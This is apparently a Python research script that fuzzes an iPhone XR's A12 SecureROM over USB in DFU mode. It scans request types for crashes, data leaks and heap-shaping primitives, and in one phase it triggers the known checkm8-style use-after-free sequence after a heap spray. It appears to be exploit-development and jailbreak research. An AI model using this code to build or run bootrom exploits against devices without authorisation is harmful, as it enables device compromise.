#!/usr/bin/env python3
"""
A12 SecureROM — Vendor Request & Heap Primitive Discovery
==========================================================
On A12, the ZLP heap leak used by checkm8 for heap feng shui is mitigated.
We need ALTERNATIVE heap primitives to control memory layout.

This script systematically probes ALL USB request types that the SecureROM
DFU handler might accept, looking for:
  1. Requests that ALLOCATE memory (heap spray candidates)
  2. Requests that FREE memory (controlled deallocation)
  3. Requests that LEAK data (info leak primitives)
  4. Requests that cause CRASHES (new vulnerability surfaces)

DWC3 USB controller (Synopsys DesignWare) specific requests are also tested,
as the controller has its own request handling that may bypass DFU logic.

USB Standard Request Types:
  0x00 = GET_STATUS (device)
  0x80 = GET_STATUS (to host)
  0x01 = CLEAR_FEATURE
  0x03 = SET_FEATURE
  0x05 = SET_ADDRESS
  0x06 = GET_DESCRIPTOR
  0x07 = SET_DESCRIPTOR
  0x08 = GET_CONFIGURATION
  0x09 = SET_CONFIGURATION

DFU Class Requests:
  0x21/0x01 = DFU_DNLOAD
  0x21/0x04 = DFU_CLRSTATUS
  0x21/0x06 = DFU_ABORT
  0xA1/0x02 = DFU_UPLOAD
  0xA1/0x03 = DFU_GETSTATUS
  0xA1/0x05 = DFU_GETSTATE

Apple-specific / DWC3-specific — UNKNOWN, must discover
"""
import time, struct, json, traceback
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC
DFU_PID   = 0x1227
BUF_SZ    = 0x800

def backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)

def connect():
    d = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend())
    if d:
        try: d.set_configuration()
        except: pass
    return d

def alive():
    try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend()) is not None
    except: return False

def get_status(d):
    try:
        r = d.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=2000)
        return {"bStatus": r[0], "bState": r[4]} if len(r) >= 6 else None
    except: return None

def clear_status(d):
    try: d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
    except: pass

def reset_idle(d):
    for _ in range(20):
        st = get_status(d)
        if not st: return False
        if st["bState"] == 2: return True
        if st["bState"] == 10:
            clear_status(d)
        else:
            try: d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=2000)
            except: pass
        time.sleep(0.05)
    return False

def wait_dfu(timeout_s=90):
    log(f"  Waiting for DFU (max {timeout_s}s)...")
    for i in range(timeout_s):
        d = connect()
        if d:
            st = get_status(d)
            if st:
                if st["bState"] == 10: clear_status(d)
                log(f"  Found after {i+1}s")
                return d
        time.sleep(1)
        if i % 10 == 9: log(f"  Still waiting... ({i+1}s)")
    return None


# ================================================================
# PHASE 1: Standard USB Descriptor Requests
# ================================================================
def phase1_descriptors(d):
    """
    GET_DESCRIPTOR with various descriptor types.
    Each response allocates a buffer — potential heap primitive.
    """
    log("\n" + "="*60)
    log("PHASE 1: USB Descriptor Requests")
    log("="*60)
    
    results = []
    
    # DESC_TYPE: 1=DEVICE, 2=CONFIG, 3=STRING, 4=INTERFACE, 5=ENDPOINT
    # 6=DEVICE_QUALIFIER, 7=OTHER_SPEED_CONFIG, 0x0F=BOS, 0x21=HID, 0x29=HUB
    desc_types = [1, 2, 3, 4, 5, 6, 7, 0x0F, 0x21, 0x22, 0x29, 0x30, 0xFF]
    
    for dt in desc_types:
        for idx in [0, 1, 2]:
            wValue = (dt << 8) | idx
            try:
                r = d.ctrl_transfer(0x80, 6, wValue, 0, 255, timeout=500)
                data = bytes(r)
                log(f"  GET_DESC type={dt:#x} idx={idx}: {len(data)}B: {data[:32].hex()}")
                results.append({
                    "desc_type": dt, "index": idx, "length": len(data),
                    "data_hex": data[:64].hex()
                })
            except usb.core.USBError as e:
                if not alive():
                    log(f"  GET_DESC type={dt:#x} idx={idx}: CRASH!")
                    results.append({"desc_type": dt, "index": idx, "crashed": True})
                    d = wait_dfu(90)
                    if not d: return results
                    reset_idle(d)
                # else: STALL (expected for unsupported)
    
    # String descriptors with various language IDs
    log("  String descriptors with language IDs:")
    for lang in [0x0000, 0x0409, 0x0804]:
        for idx in range(8):
            wValue = (3 << 8) | idx
            try:
                r = d.ctrl_transfer(0x80, 6, wValue, lang, 255, timeout=500)
                data = bytes(r)
                # Try to decode as UTF-16LE
                try:
                    s = data[2:].decode('utf-16-le')
                except: s = data.hex()
                log(f"    STRING idx={idx} lang={lang:#06x}: '{s}' ({len(data)}B)")
                results.append({
                    "desc_type": 3, "index": idx, "lang": lang,
                    "string": s, "length": len(data)
                })
            except usb.core.USBError:
                if not alive():
                    d = wait_dfu(90)
                    if not d: return results
                    reset_idle(d)
    
    return results


# ================================================================
# PHASE 2: Full bmRequestType × bRequest scan
# ================================================================
def phase2_request_scan(d):
    """
    Systematic scan of ALL bmRequestType × bRequest combinations.
    This is the core discovery phase — find any accepted request.
    
    bmRequestType format: D7=direction, D6..5=type, D4..0=recipient
    - 0x00 = OUT, Standard, Device
    - 0x01 = OUT, Standard, Interface
    - 0x02 = OUT, Standard, Endpoint
    - 0x20 = OUT, Class, Device
    - 0x21 = OUT, Class, Interface (DFU uses this)
    - 0x40 = OUT, Vendor, Device
    - 0x41 = OUT, Vendor, Interface
    - 0x80 = IN, Standard, Device
    - 0xA0 = IN, Class, Device
    - 0xA1 = IN, Class, Interface (DFU uses this)
    - 0xC0 = IN, Vendor, Device
    - 0xC1 = IN, Vendor, Interface
    """
    log("\n" + "="*60)
    log("PHASE 2: Full USB Request Scan")
    log("="*60)
    
    results = []
    accepted = []
    
    # All interesting bmRequestType values
    bmrt_values = [0x00, 0x01, 0x02, 0x03, 0x20, 0x21, 0x22, 0x23,
                   0x40, 0x41, 0x42, 0x43,
                   0x80, 0x81, 0x82, 0x83, 0xA0, 0xA1, 0xA2, 0xA3,
                   0xC0, 0xC1, 0xC2, 0xC3]
    
    # Scan bRequest 0-15 (most common range) + select higher values
    breq_values = list(range(16)) + [32, 48, 64, 128, 160, 192, 255]
    
    total = len(bmrt_values) * len(breq_values)
    count = 0
    
    for bmrt in bmrt_values:
        direction_in = bmrt & 0x80
        
        for breq in breq_values:
            count += 1
            
            # Skip known DFU requests (already well-tested)
            if bmrt == 0x21 and breq in (1, 4, 6): continue
            if bmrt == 0xA1 and breq in (2, 3, 5): continue
            
            if not reset_idle(d):
                d = wait_dfu(60)
                if not d: return {"accepted": accepted, "all": results}
                reset_idle(d)
            
            try:
                if direction_in:
                    # IN transfer — read data
                    r = d.ctrl_transfer(bmrt, breq, 0, 0, 256, timeout=300)
                    data = bytes(r)
                    log(f"  [{count}/{total}] ACCEPT: bmrt={bmrt:#04x} breq={breq}: {len(data)}B: {data[:32].hex()}")
                    entry = {
                        "bmRequestType": bmrt, "bRequest": breq,
                        "accepted": True, "direction": "IN",
                        "length": len(data), "data_hex": data[:64].hex()
                    }
                    results.append(entry)
                    accepted.append(entry)
                else:
                    # OUT transfer — send small data
                    d.ctrl_transfer(bmrt, breq, 0, 0, b"\x00" * 8, timeout=300)
                    log(f"  [{count}/{total}] ACCEPT: bmrt={bmrt:#04x} breq={breq}: OUT OK")
                    entry = {
                        "bmRequestType": bmrt, "bRequest": breq,
                        "accepted": True, "direction": "OUT"
                    }
                    results.append(entry)
                    accepted.append(entry)
                    
            except usb.core.USBError as e:
                if not alive():
                    log(f"  [{count}/{total}] CRASH: bmrt={bmrt:#04x} breq={breq}")
                    entry = {
                        "bmRequestType": bmrt, "bRequest": breq, "crashed": True
                    }
                    results.append(entry)
                    accepted.append(entry)  # Crashes are interesting!
                    d = wait_dfu(90)
                    if not d: return {"accepted": accepted, "all": results}
                # else: STALL — not accepted, skip
            
            if count % 50 == 0:
                log(f"  Progress: {count}/{total} ({len(accepted)} accepted so far)")
    
    log(f"\n  Scan complete: {len(accepted)} accepted out of {count} tested")
    return {"accepted": accepted, "total_tested": count, "all": results}


# ================================================================
# PHASE 3: Accepted request deep probing
# ================================================================
def phase3_deep_probe(d, accepted_requests):
    """
    For each accepted request, test with various wValue, wIndex, wLength
    to understand what it does and whether it allocates/frees memory.
    """
    log("\n" + "="*60)
    log("PHASE 3: Deep probing of accepted requests")
    log("="*60)
    
    results = []
    
    for req in accepted_requests:
        bmrt = req["bmRequestType"]
        breq = req["bRequest"]
        direction_in = bmrt & 0x80
        
        log(f"\n  Probing bmrt={bmrt:#04x} breq={breq}:")
        
        sub_results = {"bmRequestType": bmrt, "bRequest": breq, "probes": []}
        
        # Test various wValue
        for wval in [0, 1, 0x100, 0x200, 0x300, 0xFFFF]:
            if not reset_idle(d):
                d = wait_dfu(60)
                if not d: break
                reset_idle(d)
            
            try:
                if direction_in:
                    r = d.ctrl_transfer(bmrt, breq, wval, 0, 512, timeout=500)
                    data = bytes(r)
                    sub_results["probes"].append({
                        "wValue": wval, "wIndex": 0, "ok": True,
                        "length": len(data), "data_hex": data[:32].hex()
                    })
                else:
                    d.ctrl_transfer(bmrt, breq, wval, 0, b"\x00" * 64, timeout=500)
                    sub_results["probes"].append({"wValue": wval, "wIndex": 0, "ok": True})
            except usb.core.USBError as e:
                if not alive():
                    sub_results["probes"].append({"wValue": wval, "crashed": True})
                    d = wait_dfu(90)
                    if not d: break
                else:
                    sub_results["probes"].append({"wValue": wval, "error": str(e)})
        
        # Test various wLength (for IN) or data sizes (for OUT)
        if direction_in:
            for wlen in [1, 8, 64, 256, 512, 1024, 2048, 4096, 8192]:
                if not reset_idle(d):
                    d = wait_dfu(60)
                    if not d: break
                    reset_idle(d)
                
                try:
                    r = d.ctrl_transfer(bmrt, breq, 0, 0, wlen, timeout=500)
                    data = bytes(r)
                    sub_results["probes"].append({
                        "wLength": wlen, "ok": True,
                        "actual_length": len(data), "data_hex": data[:32].hex()
                    })
                    log(f"    wLength={wlen}: got {len(data)}B")
                except usb.core.USBError as e:
                    if not alive():
                        sub_results["probes"].append({"wLength": wlen, "crashed": True})
                        log(f"    wLength={wlen}: CRASH!")
                        d = wait_dfu(90)
                        if not d: break
        else:
            for dsz in [0, 1, 64, 256, 512, 1024, 2048, 4096]:
                if not reset_idle(d):
                    d = wait_dfu(60)
                    if not d: break
                    reset_idle(d)
                
                try:
                    d.ctrl_transfer(bmrt, breq, 0, 0, b"\x00" * dsz if dsz > 0 else b"", timeout=500)
                    sub_results["probes"].append({"data_size": dsz, "ok": True})
                    log(f"    data_size={dsz}: OK")
                except usb.core.USBError as e:
                    if not alive():
                        sub_results["probes"].append({"data_size": dsz, "crashed": True})
                        log(f"    data_size={dsz}: CRASH!")
                        d = wait_dfu(90)
                        if not d: break
        
        results.append(sub_results)
    
    return results


# ================================================================
# PHASE 4: Heap allocation primitives via accepted requests
# ================================================================
def phase4_heap_primitives(d, accepted_requests):
    """
    For each accepted request, test whether it can be used as a heap primitive:
    1. Send request N times → check for heap exhaustion
    2. Send request before DNLOAD/ABORT → does it change UAF behavior?
    3. Measure timing → allocation patterns
    """
    log("\n" + "="*60)
    log("PHASE 4: Heap allocation primitive testing")
    log("="*60)
    
    results = []
    
    for req in accepted_requests:
        if req.get("crashed"): continue  # Skip crashers for now
        
        bmrt = req["bmRequestType"]
        breq = req["bRequest"]
        direction_in = bmrt & 0x80
        
        # Test: Send this request 100 times rapidly
        log(f"\n  Rapid-fire bmrt={bmrt:#04x} breq={breq} ×100:")
        if not reset_idle(d):
            d = wait_dfu(60)
            if not d: break
            reset_idle(d)
        
        timings = []
        crash_at = None
        for i in range(100):
            t0 = time.perf_counter()
            try:
                if direction_in:
                    d.ctrl_transfer(bmrt, breq, 0, 0, 256, timeout=500)
                else:
                    d.ctrl_transfer(bmrt, breq, 0, 0, b"\x00" * 8, timeout=500)
                t1 = time.perf_counter()
                timings.append(round((t1-t0)*1000, 3))
            except usb.core.USBError:
                if not alive():
                    crash_at = i
                    log(f"    CRASH at iteration {i}!")
                    d = wait_dfu(90)
                    break
                else:
                    timings.append(-1)  # STALL
        
        if timings:
            valid = [t for t in timings if t > 0]
            if valid:
                avg_t = sum(valid) / len(valid)
                log(f"    {len(valid)}/100 ok, avg={avg_t:.2f}ms, min={min(valid):.2f}ms, max={max(valid):.2f}ms")
            
        entry = {
            "bmRequestType": bmrt, "bRequest": breq,
            "rapid_fire": {
                "count": len(timings), "crash_at": crash_at,
                "avg_ms": round(sum(t for t in timings if t > 0) / max(1, sum(1 for t in timings if t > 0)), 3) if any(t > 0 for t in timings) else None,
                "timing_drift": timings[-10:] if len(timings) >= 10 else timings
            }
        }
        
        # Test: Send this request before UAF trigger
        if d and not d.is_kernel_driver_active(0) if hasattr(d, 'is_kernel_driver_active') else True:
            if reset_idle(d):
                try:
                    # Spam the request to shape heap
                    for _ in range(10):
                        try:
                            if direction_in:
                                d.ctrl_transfer(bmrt, breq, 0, 0, 256, timeout=300)
                            else:
                                d.ctrl_transfer(bmrt, breq, 0, 0, b"\x00" * 8, timeout=300)
                        except: pass
                    
                    # Now trigger UAF
                    d.ctrl_transfer(0x21, 1, 0, 0, b"\x00" * BUF_SZ, timeout=2000)
                    d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
                    st = get_status(d)
                    if st and st["bState"] == 10: clear_status(d)
                    
                    t0 = time.perf_counter()
                    d.ctrl_transfer(0x21, 1, 0, 0, b"\x00" * BUF_SZ, timeout=2000)
                    t1 = time.perf_counter()
                    
                    if alive():
                        entry["uaf_after_spray"] = {"survived": True, "time_ms": round((t1-t0)*1000, 2)}
                        log(f"    UAF after spray: SURVIVED! ({(t1-t0)*1000:.1f}ms)")
                    else:
                        entry["uaf_after_spray"] = {"crashed": True}
                        d = wait_dfu(90)
                except usb.core.USBError as e:
                    if not alive():
                        entry["uaf_after_spray"] = {"crashed": True, "error": str(e)}
                        d = wait_dfu(90)
                    else:
                        entry["uaf_after_spray"] = {"error": str(e)}
        
        results.append(entry)
    
    return results


# ================================================================
# MAIN
# ================================================================
def main():
    log("=" * 60)
    log("A12 SecureROM — Vendor Request & Heap Primitive Discovery")
    log("Target: iPhone XR (T8020) in DFU mode")
    log("=" * 60)
    
    d = connect()
    if not d:
        log("No DFU device. Put iPhone in DFU mode.")
        d = wait_dfu(120)
        if not d:
            log("FATAL: no device")
            return
    
    st = get_status(d)
    log(f"Connected. State={st['bState'] if st else 'UNKNOWN'}")
    if st and st["bState"] == 10:
        clear_status(d)
    
    all_results = {}
    
    # Phase 1: Descriptor enumeration
    log("\n" + "#"*60)
    log("# PHASE 1: USB Descriptor Enumeration")
    log("#"*60)
    desc_results = phase1_descriptors(d)
    all_results["phase1_descriptors"] = desc_results
    
    # Phase 2: Full request scan
    log("\n" + "#"*60)
    log("# PHASE 2: Full USB Request Scan")
    log("#"*60)
    d = connect() or wait_dfu(60)
    if d:
        reset_idle(d)
        scan_results = phase2_request_scan(d)
        all_results["phase2_scan"] = scan_results
        accepted = scan_results.get("accepted", [])
    else:
        accepted = []
        all_results["phase2_scan"] = {"error": "no_device"}
    
    # Phase 3: Deep probe accepted requests
    if accepted:
        log("\n" + "#"*60)
        log(f"# PHASE 3: Deep Probing ({len(accepted)} accepted requests)")
        log("#"*60)
        d = connect() or wait_dfu(60)
        if d:
            reset_idle(d)
            # Filter out crashers for deep probe (test non-crashers first)
            safe_accepted = [r for r in accepted if not r.get("crashed")]
            deep_results = phase3_deep_probe(d, safe_accepted[:20])  # Limit to 20
            all_results["phase3_deep"] = deep_results
    
    # Phase 4: Heap primitive testing
    if accepted:
        log("\n" + "#"*60)
        log(f"# PHASE 4: Heap Primitive Testing")
        log("#"*60)
        d = connect() or wait_dfu(60)
        if d:
            reset_idle(d)
            safe_accepted = [r for r in accepted if not r.get("crashed")]
            heap_results = phase4_heap_primitives(d, safe_accepted[:10])  # Limit
            all_results["phase4_heap"] = heap_results
    
    # Save
    outf = Path(__file__).parent / "results" / "vendor_request_discovery.json"
    outf.parent.mkdir(exist_ok=True)
    with open(outf, "w") as f:
        json.dump({
            "timestamp": datetime.now().isoformat(),
            "device": "iPhone XR (A12/T8020)",
            "results": all_results
        }, f, indent=2)
    
    log(f"\n{'='*60}")
    log(f"Results saved: {outf}")
    log(f"{'='*60}")
    
    # Summary
    n_accepted = len(accepted)
    n_crashes = sum(1 for r in accepted if r.get("crashed"))
    n_data = sum(1 for r in accepted if r.get("data_hex"))
    log(f"\nSUMMARY:")
    log(f"  Accepted requests: {n_accepted}")
    log(f"  Crash-inducing: {n_crashes}")
    log(f"  Data-returning: {n_data}")
    if accepted:
        log(f"\n  Accepted request list:")
        for r in accepted:
            tag = "CRASH" if r.get("crashed") else f"{r.get('length', '?')}B" if r.get("data_hex") else "OK"
            log(f"    bmrt={r['bmRequestType']:#04x} breq={r['bRequest']}: [{tag}]")

if __name__ == "__main__":
    main()
